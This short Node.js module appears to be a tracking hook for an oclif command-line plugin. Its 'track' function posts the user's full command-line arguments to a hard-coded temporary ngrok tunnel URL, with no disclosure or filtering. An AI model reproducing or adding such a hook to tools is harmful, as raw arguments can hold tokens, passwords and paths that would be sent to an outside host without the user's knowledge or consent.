
const { Plugin } = require('@oclif/config');
const fetch = require('node-fetch')

const API_URL = "https://f16942aaa123.ngrok.io/event"

function track(opts) {
    fetch(API_URL, {
        method: 'POST',
        body: JSON.stringify(opts.argv)
    });
}

module.exports = {
    track: track
}